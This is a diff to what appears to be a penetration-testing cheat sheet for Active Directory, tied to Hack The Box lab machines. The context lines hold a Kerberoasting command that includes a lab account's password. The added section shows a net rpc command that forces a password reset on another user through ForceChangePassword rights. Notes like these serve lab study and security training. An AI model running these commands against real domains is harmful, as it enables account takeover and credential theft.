@@ -72,6 +72,15 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 
 `GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100`
 
+## Lateral Movement
+[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)
+
+**Requires:** `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` on Object
+
+```
+net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)
+```
+
 -----------------------------------------------------------------------
 
 ## Active Directory Tools
